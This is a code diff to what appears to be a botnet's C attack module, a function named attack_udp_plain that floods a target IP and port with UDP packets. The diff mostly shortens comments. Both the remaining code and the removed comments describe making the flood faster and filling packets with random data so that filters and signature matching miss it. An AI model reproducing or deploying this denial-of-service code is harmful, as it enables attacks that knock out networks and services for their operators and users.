@@ -13,12 +13,7 @@
 
 #include "attack.h"
 
-// Highly Optimized UDP Flood
-// Focus: PPS (Packets Per Second)
-// Changes:
-// - Connected UDP socket (kernel routing bypass)
-// - Random payload generation (prevent compression/filtering)
-// - Tight loop
+// high pps udp flood
 void attack_udp_plain(uint32_t ip, uint16_t port, uint32_t duration) {
     int sock = socket(AF_INET, SOCK_DGRAM, 0);
     if (sock < 0) return;
@@ -28,21 +23,14 @@ void attack_udp_plain(uint32_t ip, uint16_t port, uint32_t duration) {
     dest.sin_port = htons(port);
     dest.sin_addr.s_addr = ip;
 
-    // Connect allows `send` instead of `sendto`, skipping route lookups per packet
-    // This provides a ~15-20% speedup in PPS on Linux.
+    // connect() skips routing lookups
     if (connect(sock, (struct sockaddr *)&dest, sizeof(dest)) == -1) {
         close(sock);
         return;
     }
 
-    // Packet Buffer
-    // Varied sizes are harder to filter.
-    // We choose a "sweet spot" size: 512-1024 bytes for bandwidth, or 1 byte for PPS.
-    // Let's do a mix or standard high-bandwidth.
-    // Defaulting to randomized buffer to avoid simple signature matching.
     char packet[1024];
     
-    // Pre-seed with random junk
     for (int i = 0; i < 1024; i += 4) {
         *(uint32_t *)&packet[i] = fast_rand();
     }
